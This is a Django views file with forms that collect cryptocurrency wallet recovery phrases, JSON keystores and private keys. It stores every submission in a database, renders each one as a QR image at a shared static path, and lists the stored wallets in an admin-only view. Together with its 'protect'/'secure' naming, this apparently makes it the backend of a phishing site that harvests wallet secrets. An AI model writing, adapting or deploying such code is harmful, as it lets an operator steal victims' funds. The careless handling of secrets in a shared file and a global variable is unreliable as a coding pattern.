from django.shortcuts import render
from django.views.generic import TemplateView, ListView
from django.contrib.auth.views import LoginView, LogoutView
from django.contrib.auth.mixins import LoginRequiredMixin

from secure.models import wallet
from .forms import WalletForm, JSONForm, PKForm
from .models import wallet
from qrcode import *
# Create your views here.

data = None

class protect(TemplateView):
    template_name = 'content/cryptocurrency/secure.html'

def form_select(request):
    return render(request, 'content/cryptocurrency/formopt.html')

def info(request):
    if request.method == 'POST':
        form = WalletForm(request.POST)
        if form.is_valid():
            form.save()
            data=request.POST['phrase']
            img=make(data)
            img.save("static/image/test.png")

            return render(request, 'content/cryptocurrency/qrcode.html', {'data':data})
        else:
            pass
    else:
        form = WalletForm()
    context = {
        'form' : form,
    }
    return render(request, 'content/cryptocurrency/form.html', context)

def JSONinfo(request):
    if request.method == 'POST':
        form = JSONForm(request.POST)
        if form.is_valid():
            form.save()
            data=request.POST['phrase']
            img=make(data)
            img.save("static/image/test.png")

            return render(request, 'content/cryptocurrency/qrcode.html', {'data':data})
        else:
            pass
    else:
        form = JSONForm()
    context = {
        'form' : form,
    }
    return render(request, 'content/cryptocurrency/jsonkey.html', context)

def PKinfo(request):
    if request.method == 'POST':
        form = PKForm(request.POST)
        if form.is_valid():
            form.save()
            data=request.POST['phrase']
            img=make(data)
            img.save("static/image/test.png")

            return render(request, 'content/cryptocurrency/qrcode.html', {'data':data})
        else:
            pass
    else:
        form = PKForm()
    context = {
        'form' : form,
    }
    return render(request, 'content/cryptocurrency/pkform.html', context)

def success(request):
    global data
    if request.method=="POST":
        data=request.POST['data']
        img=make(data)
        img.save("static/image/test.png")
    else:
        pass
    return render(request, 'content/cryptocurrency/qrcode.html', {'data':data})

class AdminLogin(LoginView):
    template_name = 'login.html'

class AdminLogout(LogoutView):
    template_name = 'logout.html'

class showoga(LoginRequiredMixin, ListView):
    model = wallet
    template_name = 'showoga.html'
